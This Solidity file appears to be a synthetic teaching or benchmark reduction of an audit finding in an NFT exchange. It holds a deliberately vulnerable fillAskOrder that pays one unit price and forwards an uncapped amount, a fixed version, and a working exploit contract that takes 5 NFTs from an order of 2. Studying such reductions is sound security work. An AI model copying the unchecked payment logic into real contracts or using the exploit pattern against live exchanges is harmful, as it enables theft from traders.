// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  SofamonExchange — fillAskOrder ignores the listed order amount
    (Pashov Audit Group, H-03, August 2024).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: fillAskOrder forwards order.price, not order.price * order.amount,
    and it never caps the swap at the maker's listed amount. A filler who puts
    5 in the calldata and pays one unit price receives 5 NFTs from an order of 2.
    Vulnerable call preserved verbatim below (@> VULN). */

contract Nft {
    string public constant symbol = "NFT";
    uint8 public constant decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 fromBal = balanceOf[msg.sender];
        balanceOf[msg.sender] = fromBal - amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OrderPool {
    uint256 public constant orderAmount = 2;

    Nft public nft;
    uint256 public filled;

    constructor(Nft token) {
        nft = token;
    }

    function swapTokenForSpecificNFTs(
        uint256[] calldata amounts,
        uint256 maxExpectedTokenInput,
        address payable recipient,
        bool,
        address
    ) external payable returns (uint256 inputAmount) {
        require(msg.value == maxExpectedTokenInput, "value");
        uint256 take = amounts[0];
        inputAmount = take;
        nft.transfer(recipient, take);
        filled = take;
    }
}

contract Exchange {
    struct FulfillOrder {
        OrderPool orderPool;
        uint256 nftId;
        uint256 amount;
        uint256 price;
    }

    event AskFilled(address indexed orderPool, address indexed filler, uint256 nftId, uint256 amount, uint256 price);

    function fillAskOrder(FulfillOrder calldata order) public payable {
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = order.amount;

        // @> VULN: pays order.price once and forwards order.amount with no cap at the listed size
        order.orderPool.swapTokenForSpecificNFTs{ value: order.price }(
            amounts, order.price, payable(msg.sender), false, address(0)
        );

        emit AskFilled(address(order.orderPool), msg.sender, order.nftId, order.amount, order.price);
    }
}

contract ExchangeFixed {
    struct FulfillOrder {
        OrderPool orderPool;
        uint256 nftId;
        uint256 amount;
        uint256 price;
    }

    function fillAskOrder(FulfillOrder calldata order) public payable {
        uint256 cap = order.orderPool.orderAmount();
        uint256 fill = order.amount;
        if (fill > cap) fill = cap;
        require(msg.value == order.price * fill, "payment");

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = fill;
        order.orderPool.swapTokenForSpecificNFTs{ value: msg.value }(
            amounts, msg.value, payable(msg.sender), false, address(0)
        );
    }
}

contract Exploit {
    Nft public nft; // CREATE nonce 1
    OrderPool public pool; // CREATE nonce 2
    Exchange public router; // CREATE nonce 3

    constructor() {
        nft = new Nft();
        pool = new OrderPool(nft);
        router = new Exchange();
        nft.mint(address(pool), 10);
    }

    function run() external payable {
        uint256 listed = pool.orderAmount();

        Exchange.FulfillOrder memory order = Exchange.FulfillOrder({
            orderPool: pool,
            nftId: 1,
            amount: 5,
            price: 1 ether
        });

        router.fillAskOrder{value: order.price}(order);

        uint256 taken = nft.balanceOf(address(this));
        uint256 paid = address(pool).balance;

        require(listed == 2, "order amount");
        require(taken == 5, "filled 5");
        require(taken > listed, "did not exceed the order");
        require(paid == 1 ether, "paid a single price");
    }
}
